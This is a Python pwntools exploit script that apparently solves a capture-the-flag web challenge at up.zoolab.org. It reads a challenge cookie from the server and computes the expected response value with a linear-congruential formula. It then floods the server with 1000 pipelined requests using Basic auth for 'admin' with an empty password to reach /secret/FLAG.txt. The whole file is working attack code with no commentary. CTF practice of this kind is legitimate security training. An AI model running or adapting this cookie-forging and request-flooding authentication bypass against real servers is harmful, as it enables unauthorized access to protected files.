from pwn import *
import re
import base64

HOST = 'up.zoolab.org'
PORT = 10933
PATH = "/secret/FLAG.txt"

PASSWD = base64.b64encode(b"admin:").decode()
FLAG_PATTERN = r"FLAG\{.*?\}"

conn = remote(HOST, PORT)

def calculate_cookie(seed):
    value = seed * 6364136223846793005 + 1
    value &= 0xffffffffffffffff
    value >>= 33
    return value

def get_cookie():
    req1 = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()
    conn.send(req1)

    response = conn.recvuntil(b"\r\n\r\n")

    length_match = re.search(b"Content-Length: (\\d+)", response, re.IGNORECASE)
    if length_match:
        length = int(length_match.group(1))
        if length > 0:
            conn.recv(length, timeout=2)

    cookie_match = re.search(b"Set-Cookie: challenge=(\\d+);", response)
    seed = int(cookie_match.group(1))
    cookie_value = calculate_cookie(seed)

    return cookie_value

def attack():
    
    cookie_value = get_cookie()

    req2 = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Authorization: Basic {PASSWD}\r\n"
        f"Cookie: response={cookie_value}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()
    
    for _ in range(1000):
        conn.send(req2)

    received = conn.recvall(timeout=2)

    response = received.decode(errors='ignore')
    flag_match = re.search(FLAG_PATTERN, response)

    if flag_match:
        print(f"[+] FLAG FOUND: {flag_match.group(0)}")
    else:
        print(f"[-] FLAG NOT FOUND: No No No...")

attack()